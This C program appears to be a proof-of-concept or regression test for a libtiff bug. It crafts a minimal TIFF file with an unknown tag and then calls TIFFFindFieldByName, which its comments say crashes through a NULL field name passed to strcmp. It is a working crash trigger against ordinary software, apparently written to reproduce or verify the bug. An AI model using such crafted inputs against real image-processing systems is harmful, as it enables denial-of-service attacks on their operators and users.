#include <tiffio.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

static int write_minimal_tiff_with_unknown_tag(const char *path)
{
    /* Little-endian minimal TIFF with a single unknown tag (65000) */
    /* Layout:
       Offset 0:  'II' 0x2A, IFD offset = 8
       Offset 8:  num dir entries = 1
       Entry: tag=65000, type=SHORT(3), count=1, value=1 (in value/offset field)
       Next IFD offset = 0
    */
    unsigned char data[] = {
        0x49, 0x49,             /* 'II' little-endian */
        0x2A, 0x00,             /* magic 42 */
        0x08, 0x00, 0x00, 0x00, /* offset to IFD = 8 */
        0x01, 0x00,             /* number of directory entries = 1 */
        /* dir entry (12 bytes) */
        0xE8, 0xFD,             /* tag = 65000 (0xFDE8) */
        0x03, 0x00,             /* type = SHORT (3) */
        0x01, 0x00, 0x00, 0x00, /* count = 1 */
        0x01, 0x00, 0x00, 0x00, /* value = 1 (fits in 4-byte value field) */
        /* next IFD offset */
        0x00, 0x00, 0x00, 0x00
    };

    FILE *f = fopen(path, "wb");
    if (!f)
        return -1;
    size_t n = fwrite(data, 1, sizeof(data), f);
    fclose(f);
    return (n == sizeof(data)) ? 0 : -1;
}

int main(void)
{
    char path[] = "/tmp/libtiff_anon_XXXXXX.tif";
    /* mkstemp requires XXXXXX at end; we provided .tif after that, so manually handle */
    char tmpl[] = "/tmp/libtiff_anon_XXXXXX";
    int fd = mkstemp(tmpl);
    if (fd < 0) {
        perror("mkstemp");
        return 1;
    }
    close(fd);
    /* Build full path with .tif extension */
    snprintf(path, sizeof(path), "%s.tif", tmpl);

    if (write_minimal_tiff_with_unknown_tag(path) != 0) {
        fprintf(stderr, "Failed to write test TIFF to %s\n", path);
        unlink(tmpl); /* cleanup temp base */
        return 1;
    }

    TIFF *tif = TIFFOpen(path, "r");
    if (!tif) {
        fprintf(stderr, "TIFFOpen failed\n");
        unlink(path);
        unlink(tmpl);
        return 1;
    }

    /* Ensure IFD 0 is read so the unknown tag is processed and an anonymous field is created */
    if (!TIFFReadDirectory(tif)) {
        fprintf(stderr, "TIFFReadDirectory failed (still proceeding to trigger)\n");
    }

    /* Trigger: request a field by name; libtiff will build or search the name-sorted
       field list using tagNameCompare, which calls strcmp(ta->field_name, tb->field_name).
       Our tif->tif_fields contains an anonymous field with field_name == NULL,
       leading to a NULL dereference in strcmp. */
    const TIFFField *fld = TIFFFindFieldByName(tif, "NonExistentFieldName_Trigger", TIFF_ANY);

    /* We should not get here if the bug is present; keep code to avoid optimization */
    if (fld) {
        printf("Unexpectedly found field: %s\n", TIFFFieldName(fld));
    } else {
        printf("Field not found (if no crash occurred, the bug may be fixed)\n");
    }

    TIFFClose(tif);
    unlink(path);
    unlink(tmpl);
    return 0;
}
